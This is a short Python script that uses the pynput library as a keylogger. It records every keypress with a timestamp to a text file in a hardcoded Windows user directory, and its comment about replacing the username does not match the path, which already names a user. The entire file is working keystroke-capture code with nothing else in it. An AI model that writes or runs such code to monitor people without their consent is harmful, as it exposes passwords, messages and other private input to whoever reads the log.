from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/zenyt/Downloads/linux/"  # Replace 'YourUsername' with your actual username
logging.basicConfig(filename=log_dir + "key_log.txt",
                    level=logging.DEBUG,
                    format='%(asctime)s:%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
